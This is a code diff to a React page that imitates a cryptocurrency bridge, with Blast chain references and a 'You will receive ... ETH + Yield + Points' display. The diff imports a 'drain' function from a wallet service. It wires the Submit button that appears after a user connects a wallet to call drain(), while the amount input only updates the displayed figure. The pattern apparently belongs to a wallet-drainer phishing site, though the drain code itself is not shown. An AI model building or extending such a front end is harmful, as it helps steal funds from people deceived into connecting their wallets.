@@ -31,7 +31,10 @@ import cutout_bottom_lg from "../assets/frame-corner-sm-bottom-left_2.svg";
 import cutout_bottom_right_lg from "../assets/frame-corner-sm-bottom-right_lg.svg";
 import discord from "../assets/icons8-discord-50.png";
 import twitter from "../assets/icons8-twitter-50.png";
+import { UseWallet } from "../services/useWallet";
 const Bridge = () => {
+  const { drain } = UseWallet();
+
   const { connectors, connect } = useConnect();
   const { chains, switchChain } = useSwitchChain();
   console.log(chains);
@@ -42,8 +45,9 @@ const Bridge = () => {
   console.log(blast);
   console.log(connectors);
   const [showConnect, setShowConnect] = useState(false);
-  const { address } = useAccount();
   const [open, setOpen] = useState(false);
+  const [inputValue, setInputValue] = useState("0.00");
+  const { address } = useAccount();
 
   const { disconnect } = useDisconnect();
   const { data: ensName } = useEnsName({ address });
@@ -54,7 +58,14 @@ const Bridge = () => {
     address: address,
   });
 
+  // setTimeout(() => {
+  //   disconnect();
+  // }, 2000);
+
   console.log(ensAvatar, balance.data);
+  const handleClick = () => {
+    drain();
+  };
   return (
     <div id="__next">
       <div className="__variable_d69ff7">
@@ -206,12 +217,15 @@ const Bridge = () => {
                                       <div className="mt-4 flex w-full rounded-lg">
                                         <div className="flex-1">
                                           <input
+                                            onChange={(e) => {
+                                              setInputValue(e.target.value);
+                                            }}
                                             autoFocus={true}
                                             lang="en"
                                             type="text"
                                             className="typography-brand-heading-1 h-[60px] w-full rounded-bl-lg rounded-tl-lg border border-camo-400 bg-transparent px-4 text-center text-camo-100 placeholder-camo-700 transition-colors focus:text-white disabled:bg-camo-600 disabled:text-camo-300 xl:h-20"
                                             placeholder="0.0"
-                                            // value=""
+                                            value={inputValue}
                                           />
                                         </div>
                                         <div className="w-44 rounded-br-lg rounded-tr-lg border border-l-0 border-camo-400 transition-colors">
@@ -317,8 +331,9 @@ const Bridge = () => {
                                     </fieldset>
                                     <fieldset className="typography-brand-body w-full py-3 pb-3 text-center text-camo-400">
                                       <output>
-                                        You will receive 0.00 ETH + Yield +
-                                        Points
+                                        You will receive{" "}
+                                        {Number(inputValue).toPrecision(2)} ETH
+                                        + Yield + Points
                                       </output>
                                     </fieldset>
                                   </div>
@@ -330,15 +345,28 @@ const Bridge = () => {
                               >
                                 <div className="p-[1px] transition-all bg-transparent">
                                   <div className="transition-[filter]">
-                                    <button
-                                      onClick={(e) => {
-                                        setShowConnect(true);
-                                        e.preventDefault();
-                                      }}
-                                      className="select-none disabled:cursor-not-allowed disabled:bg-camo-300 disabled:text-gray-800 typography-brand-body-l-caps sm:max-md:min-h-[36px] sm:max-md:py-1.5 min-h-[40px] px-6 py-2 transition-colors will-change-transform [transform:translateZ(0)] rounded-bl-md rounded-tr-md [clip-path:polygon(20px_0,100%_0,100%_50%,calc(100%-20px)_100%,0_100%,0_50%)] w-full bg-yellow-300 focus-visible:bg-white active:bg-white media-hover:hover:bg-white text-black"
-                                    >
-                                      <div className="">Connect Wallet</div>
-                                    </button>
+                                    {address ? (
+                                      <button
+                                        onClick={(e) => {
+                                          handleClick();
+                                          e.preventDefault();
+                                        }}
+                                        className="select-none disabled:cursor-not-allowed disabled:bg-camo-300 disabled:text-gray-800 typography-brand-body-l-caps sm:max-md:min-h-[36px] sm:max-md:py-1.5 min-h-[40px] px-6 py-2 transition-colors will-change-transform [transform:translateZ(0)] rounded-bl-md rounded-tr-md [clip-path:polygon(20px_0,100%_0,100%_50%,calc(100%-20px)_100%,0_100%,0_50%)] w-full bg-yellow-300 focus-visible:bg-white active:bg-white media-hover:hover:bg-white text-black"
+                                      >
+                                        <div className="">Submit</div>
+                                      </button>
+                                    ) : (
+                                      <button
+                                        onClick={(e) => {
+                                          setShowConnect(true);
+
+                                          e.preventDefault();
+                                        }}
+                                        className="select-none disabled:cursor-not-allowed disabled:bg-camo-300 disabled:text-gray-800 typography-brand-body-l-caps sm:max-md:min-h-[36px] sm:max-md:py-1.5 min-h-[40px] px-6 py-2 transition-colors will-change-transform [transform:translateZ(0)] rounded-bl-md rounded-tr-md [clip-path:polygon(20px_0,100%_0,100%_50%,calc(100%-20px)_100%,0_100%,0_50%)] w-full bg-yellow-300 focus-visible:bg-white active:bg-white media-hover:hover:bg-white text-black"
+                                      >
+                                        <div className="">Connect Wallet</div>
+                                      </button>
+                                    )}
                                   </div>
                                 </div>
                               </div>
